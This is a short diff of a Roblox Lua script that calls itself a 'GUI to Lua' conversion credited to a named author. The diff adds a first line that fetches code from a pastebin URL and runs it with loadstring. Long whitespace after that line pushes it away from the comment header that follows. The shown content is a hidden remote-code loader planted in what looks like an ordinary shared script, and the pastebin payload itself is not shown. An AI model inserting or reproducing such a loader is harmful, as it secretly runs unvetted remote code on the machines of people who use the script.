@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/urvzBY4a'))()
                                                                          --[[
 Converted using GUI to Lua | Version: 3.2
 Fully coded/made by Pawstep
